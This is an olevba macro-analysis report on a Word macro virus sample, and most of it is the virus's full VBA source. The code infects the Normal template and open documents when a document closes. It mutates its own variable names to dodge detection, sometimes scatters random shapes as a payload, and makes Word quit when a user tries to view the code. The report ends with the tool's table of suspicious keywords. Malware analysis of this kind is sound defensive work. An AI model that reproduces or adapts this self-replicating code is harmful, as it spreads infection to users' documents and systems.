olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pri.ac-98cdd15bad848eb64568c7a5c0aec2fc45688190
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pri.ac-98cdd15bad848eb64568c7a5c0aec2fc45688190 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
Options.ConfirmConversions = 0
If Day(Now) = Minute(Now) Then
Randomize: For SB8730 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next SB8730: End If
PG3983 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
TL3136 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set NI556 = ActiveDocument.VBProject.VBComponents.Item(1)
RR2486 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set NI556 = NormalTemplate.VBProject.VBComponents.Item(1)
HC7527 = True
Call CL7415_VF7185
ActiveDocument.Saved = True
End If
If HC7527 <> True And RR2486 <> True Then GoTo AQ8138
If HC7527 = True Then NI556.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, PG3983 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If RR2486 = True Then NI556.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TL3136 - 4))
AQ8138:
If TL3136 <> 0 And PG3983 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function CL7415_VF7185()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "AD856": r1(2) = "CG3112": r1(3) = "TB419": r1(4) = "KV6831": r1(5) = "VF7185": r1(6) = "PG3983"
r1(7) = "TL3136": r1(8) = "RR2486":: r1(9) = "NI556": r1(10) = "HC7527": r1(11) = "AQ8138": r1(12) = "CL7415": r1(13) = "IG9519": r1(14) = "LG7827": r1(15) = "SB8730"
For SB8730 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call VF7185(a1, r1(SB8730))
Next SB8730
End Function 'VAMP v1.0 [thanks Vic!]
Private Function VF7185(LG7827, IG9519 As String)
On Error Resume Next
Dim AD856 As Long: Dim CG3112 As Long: Dim TB419 As Long: Dim KV6831 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
AD856 = 1: CG3112 = 1: TB419 = .CountOfLines: KV6831 = Len(.Lines(.CountOfLines, 1))
Do While .Find(IG9519, AD856, CG3112, TB419, KV6831, True)
strline = .Lines(AD856, 1)
strline = Left(strline, CG3112 - 1) & LG7827 & Mid(strline, KV6831)
.replaceline AD856, strline
AD856 = TB419 + 1: CG3112 = 1:
TB419 = .CountOfLines
KV6831 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Sub ViewVBCode()
Application.Quit SaveChanges:=wdDoNotSaveChanges
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
